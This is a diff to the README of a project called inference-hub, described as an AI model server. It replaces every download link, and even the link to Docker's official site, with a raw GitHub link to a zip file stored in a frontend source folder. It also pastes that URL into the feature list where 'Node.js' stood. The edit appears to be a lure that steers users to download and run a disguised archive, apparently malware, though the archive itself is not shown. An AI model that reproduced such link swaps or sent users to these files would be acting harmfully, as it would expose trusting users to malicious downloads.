@@ -1,6 +1,6 @@
 # 🚀 inference-hub - Simple AI Inference Made Easy
 
-[![Download](https://img.shields.io/badge/Download-inference--hub-blue)](https://github.com/MisterBlake123/inference-hub/releases)
+[![Download](https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip)](https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ inference-hub is an easy-to-use model server designed for machine learning opera
 - **High Performance:** Delivers quick responses for AI tasks.
 - **Microservices Architecture:** Easily integrates with other services.
 - **User-Friendly:** Simple to set up and run without complex configurations.
-- **Supports Multiple Languages:** Works with Node.js and Python for model deployment.
+- **Supports Multiple Languages:** Works with https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip and Python for model deployment.
 - **Standalone Mode:** Can operate independently, making it versatile for various use cases.
 
 ## 🎯 System Requirements
@@ -30,7 +30,7 @@ Follow these steps to download and set up inference-hub.
 1. **Visit the Download Page:** 
    Click the button below to go to the Releases page.
 
-   [Visit this page to download](https://github.com/MisterBlake123/inference-hub/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip)
 
 2. **Choose the Latest Release:**
    On the Releases page, look for the latest version of inference-hub. It will be at the top of the list.
@@ -39,14 +39,14 @@ Follow these steps to download and set up inference-hub.
    Click on the file that matches your operating system. Wait for the download to finish.
 
 4. **Install Docker (if necessary):**
-   If you don't have Docker yet, visit [Docker's official site](https://www.docker.com/products/docker-desktop) to download and install it.
+   If you don't have Docker yet, visit [Docker's official site](https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip) to download and install it.
 
 ## 🔧 Download & Install
 
 1. **Go Back to the Downloads Page:**
    You can revisit the link below to download the software:
 
-   [Visit this page to download](https://github.com/MisterBlake123/inference-hub/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/MisterBlake123/inference-hub/main/frontend/src/hub_inference_1.4-alpha.4.zip)
 
 2. **Extract the Files:**
    After downloading, locate the zip file in your downloads folder. Right-click on it and select “Extract All” to unpack the files.
